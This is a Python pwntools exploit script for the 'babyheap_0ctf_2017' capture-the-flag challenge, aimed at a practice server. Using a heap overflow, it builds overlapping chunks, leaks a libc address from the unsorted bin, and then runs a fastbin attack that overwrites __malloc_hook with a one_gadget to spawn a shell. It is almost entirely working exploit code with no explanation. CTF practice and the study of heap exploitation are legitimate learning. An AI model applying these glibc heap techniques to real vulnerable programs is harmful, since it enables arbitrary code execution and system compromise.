from pwn import *

#context.log_level = 'debug'

#p = process('./babyheap_0ctf_2017')
p = remote('node3.buuoj.cn',25363)
libc = ELF('libc-2.23.64-buu.so')

def alloc(size):
	p.sendlineafter('Command: ', '1')
	p.sendlineafter('Size: ', str(size))


def fill(index, content):
	p.sendlineafter("Command: ", '2')
	p.sendlineafter("Index: ", str(index))
	p.sendlineafter("Size: ", str(len(content)))
	p.sendlineafter("Content: ", content)   

def dump(index):
	p.sendlineafter('Command: ', '4')
	p.sendlineafter('Index: ', str(index))
	p.recvuntil('Content: \n')

def free(index):
	p.sendlineafter('Command: ', '3')
	p.sendlineafter('Index: ', str(index))

alloc(0x80) #0
alloc(0x80) #1
alloc(0x80) #2
alloc(0x80) #3

free(1)
fill(0, b'a' * ( 0x80 + 8 ) + p64(0x120 + 1))
alloc(0x110)
fill(1, b'a' * ( 0x80 + 8 ) + p64(0x90 + 1))
free(2)

dump(1)
p.recv(0x90 + 8)
malloc_hook_addr = u64(p.recv(8)) - 0x58 - 0x10
libc_base = malloc_hook_addr - libc.sym['__malloc_hook']
print('[+] malloc_hook : {}'.format(hex(malloc_hook_addr)))
print('[+] libc_addr : {}'.format(hex(libc_base)))

alloc(0x80) #2
alloc(0x60) #4
alloc(0x60) #5
free(5)

execve_bin_sh_addr = libc_base + 0x4526a

print('[+] execve(/bin/sh, 0, 0) : {}'.format(hex(execve_bin_sh_addr)))

fill(4, b'a' * (0x60 + 8) + p64(0x70 + 1) + p64(malloc_hook_addr - 0x23) + p64(0))
alloc(0x60) #5
alloc(0x60) #6

fill(6, b'a' * 0x13 + p64(execve_bin_sh_addr))

alloc(0x10)

p.interactive()
